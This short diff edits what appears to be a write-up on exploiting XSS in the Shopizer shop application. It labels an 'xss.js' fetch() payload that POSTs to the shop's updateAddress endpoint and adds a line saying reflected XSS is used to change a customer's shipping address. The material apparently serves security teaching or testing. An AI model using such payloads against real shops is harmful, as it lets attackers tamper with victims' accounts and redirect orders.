@@ -233,6 +233,7 @@ alert('It worked!');
 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval ↩︎
 
 -----
+Content of xss.js:
 
 fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
     method: 'POST',
@@ -245,3 +246,5 @@ fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
   })
   
   -----
+
+Now using reflected XSS vuln, we are updating shipping address.
